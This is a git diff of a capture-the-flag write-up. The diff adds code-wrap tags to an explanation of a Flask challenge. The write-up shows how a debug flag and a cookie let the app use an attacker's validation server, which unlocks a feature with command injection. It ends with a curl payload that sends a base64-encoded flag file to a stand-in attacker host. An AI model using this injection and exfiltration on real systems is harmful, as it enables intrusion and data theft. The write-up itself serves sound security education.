@@ -48,6 +48,7 @@ The challenge comes with source code, but let's break it down rather than dumpin
 
 Starting with the `/release` route in `main.py`, we see that we need a valid `access_token` to access the new feature.
 
+{% code overflow="wrap" %}
 ```python
 @app.route('/release')
 def release():
@@ -75,9 +76,11 @@ def release():
 
     return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)
 ```
+{% endcode %}
 
 So, how is the date validated? In the code above, you'll see the `validation_server` is hardcoded into the application _but_ if the `debug` GET parameter is set to `true` _and_ the `preferences` cookie contains a `validation_server`, it will be used instead. These elements are defined at the top of the script.
 
+{% code overflow="wrap" %}
 ```python
 DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:5001'
 NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60
@@ -86,9 +89,11 @@ DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
     'language': 'en'
 }).encode()).decode()
 ```
+{% endcode %}
 
 Breaking down the validation, we first have a `validate_server` function that returns whether or not the current date is greater than (or equal to) the scheduled release date.
 
+{% code overflow="wrap" %}
 ```python
 def validate_server(validation_server):
     try:
@@ -98,9 +103,11 @@ def validate_server(validation_server):
         print(f"Error: {e}")
     return False
 ```
+{% endcode %}
 
 The `validate_access` function will first get the public key from the `/pubkey` endpoint on the specified `validation_server`.
 
+{% code overflow="wrap" %}
 ```python
 def validate_access(validation_server):
     pubkey = get_pubkey(validation_server)
@@ -116,7 +123,9 @@ def validate_access(validation_server):
     except requests.RequestException as e:
         raise Exception(f"Error validating access: {e}")
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```python
 def get_pubkey(validation_server):
     try:
@@ -127,11 +136,13 @@ def get_pubkey(validation_server):
         raise Exception(
             f"Error connecting to validation server for public key: {e}")
 ```
+{% endcode %}
 
 Next, it will issue a request to the `/` endpoint on the `validation_server` and use the public key to verify that the returned `date` signature is valid.
 
 The `validation_server` is running on a different port and will generate a private/public keypair, then sign the current date with it.
 
+{% code overflow="wrap" %}
 ```python
 key = ECC.generate(curve='p256')
 pubkey = key.public_key().export_key(format='PEM')
@@ -151,9 +162,11 @@ def index():
         'signature': signature.hex()
     })
 ```
+{% endcode %}
 
 Before formulating our attack plan, let's look at the final piece of the puzzle; the `/feature` route that will be unlocked.
 
+{% code overflow="wrap" %}
 ```python
 @app.route('/feature', methods=['GET', 'POST'])
 def feature():
@@ -181,6 +194,7 @@ def feature():
         print(f"Error: {e}")
         return redirect(url_for('index'))
 ```
+{% endcode %}
 
 It's a simple word-counting feature that takes user input and passes it directly to a command without sanitisation.
 
@@ -198,6 +212,7 @@ Based on our initial review of the application, we can outline the following pla
 
 Let's start by configuring the attacker server. We can generate a keypair with the following script.
 
+{% code overflow="wrap" %}
 ```python
 from Crypto.PublicKey import ECC
 
@@ -209,9 +224,11 @@ with open('pubkey', 'wb') as f:
 with open('privkey', 'wb') as f:
     f.write(key.export_key(format='PEM').encode('utf-8'))
 ```
+{% endcode %}
 
 We configure `server.py` to do the same thing as the real `validation_server`, _except_ that the returned date will be 7+ days in the future.
 
+{% code overflow="wrap" %}
 ```python
 from flask import Flask, jsonify
 import time
@@ -250,23 +267,29 @@ def generate_signed_date():
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=1337)
 ```
+{% endcode %}
 
 Start the server, then use some service like `ngrok` to expose the local port `1337` to the internet.
 
 Update the `preferences` cookie, e.g.
 
+{% code overflow="wrap" %}
 ```json
 { "validation_server": "https://ATTACKER_SERVER", "theme": "light", "language": "en" }
 ```
+{% endcode %}
 
 Finally, visit the challenge URL with the `debug` GET parameter set to `true`.
 
+{% code overflow="wrap" %}
 ```
 http://127.0.0.1:5000/release?debug=true
 ```
+{% endcode %}
 
 We get a hit in the server logs!
 
+{% code overflow="wrap" %}
 ```bash
 +-------------------------+----------------------------------+
 | Forwarding traffic to   |     http://localhost:1337        |
@@ -274,6 +297,7 @@ We get a hit in the server logs!
 200		GET	/pubkey
 200		GET	/
 ```
+{% endcode %}
 
 The feature is now unlocked!
 
@@ -295,9 +319,11 @@ One common way to do this is to find a writeable web directory, write the comman
 
 Another option is using standard tools to return the data, e.g., `curl`. The following input will convert the flag to base64 (so we don't lose special characters) and then make a HTTP request to our attacker server, with that encoded value as a GET parameter.
 
+{% code overflow="wrap" %}
 ```bash
 hi; curl https://ATTACKER_SERVER?lol=$(cat flag.txt | base64)
 ```
+{% endcode %}
 
 We can recheck our server logs to find the base64 encoded flag 🙂
 
